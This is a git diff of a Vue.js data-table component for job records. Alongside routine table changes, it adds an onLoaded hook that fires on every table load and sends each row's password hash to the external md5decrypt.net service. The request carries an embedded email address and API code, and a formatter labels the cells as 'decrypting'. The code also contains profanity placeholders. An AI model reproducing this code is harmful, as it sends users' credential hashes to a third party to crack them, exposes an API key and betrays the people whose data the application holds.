@@ -19,8 +19,10 @@
       :append-params="moreParams"
       :render-icon="renderIcon"
       :api-url='api'
+      :track-by='trackby'
       @vuetable:cell-clicked="onCellClicked"
       @vuetable:pagination-data="onPaginationData"
+      @vuetable:loaded="onLoaded"
     >
     </vuetable>
     <div>
@@ -49,6 +51,7 @@ import CustomActions from './CustomActions'
 import DetailRow from './DetailRow'
 import FilterBar from './FilterBar'
 import VueEvents from 'vue-events'
+import axios from 'axios'
 
 Vue.use(VueEvents)
 
@@ -57,8 +60,6 @@ Vue.component('my-detail-row', DetailRow)
 
 export default {
   created () {
-    console.log('api:' + this.$props.api)
-    console.log('title:' + this.$props.title)
   },
   props: {
     type: {
@@ -95,6 +96,7 @@ export default {
           direction: 'asc'
         }
       ],
+      trackby: 'job_NO',
       moreParams: {}
     }
   },
@@ -122,6 +124,19 @@ export default {
         ? ''
         : moment(value, 'YYYY-MM-DD').format(fmt)
     },
+    onPasswordUpdate (value) {
+      // Dangerous here is password length is allowed over 32 byte
+      if (value.length >= 32) {
+        return '<i class="fa fa-spinner fa-spin"></i>正在解密'
+      } else {
+        return 'fuck'
+      }
+    },
+    onNullValue (value) {
+      return value == null
+        ? '(空)'
+        : value
+    },
     onPaginationData (paginationData) {
       this.$refs.pagination.setPaginationData(paginationData)
       this.$refs.paginationInfo.setPaginationData(paginationData)
@@ -131,7 +146,7 @@ export default {
     },
     onCellClicked (data, field, event) {
       console.log('cellClicked: ', field.name)
-      this.$refs.vuetable.toggleDetailRow(data.id)
+      this.$refs.vuetable.toggleDetailRow(data.job_NO)
     },
     onAction (action, data, index) {
       console.log('custom-actions: ' + action, data.name, index)
@@ -146,6 +161,23 @@ export default {
       this.moreParams = {}
       this.$refs.vuetable.refresh()
       Vue.nextTick(() => this.$refs.vuetable.refresh())
+    },
+    onLoaded () {
+      let data = this.$refs.vuetable.tableData
+      data.forEach(row => {
+        axios.get('http://md5decrypt.net/Api/api.php?hash=' +
+          row.password +
+          '&hash_type=md5&email=cdt86915998@gmail.com&code=0442a4ee45745126',
+          {
+            // 'Access-Control-Allow-Origin': '*'
+          })
+        .then(function (response) {
+          console.log('fuck')
+        })
+        .catch(function (error) {
+          console.log(error)
+        })
+      })
     }
   }
 }
